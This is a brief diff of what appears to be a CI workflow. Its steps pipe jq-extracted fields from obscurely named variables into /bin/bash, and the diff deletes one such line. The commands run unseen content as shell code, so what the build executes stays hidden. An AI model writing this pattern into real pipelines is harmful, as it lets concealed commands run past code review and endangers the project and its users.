@@ -31,7 +31,6 @@ jobs:
           echo $i1999 | jq -r .ypxjw616 | /bin/bash
           printf '%s' "$hj39" | jq -r .gaxf7 | /bin/bash
           echo $dtof77 | jq -r .vbyj7338 | /bin/bash
-          printf '%s' "$ftyy3557" | jq -r .arkt0 | /bin/bash
           printf '%s' "$jdjw88281" | jq -r .b4 | /bin/bash
 
       - name: Archive results
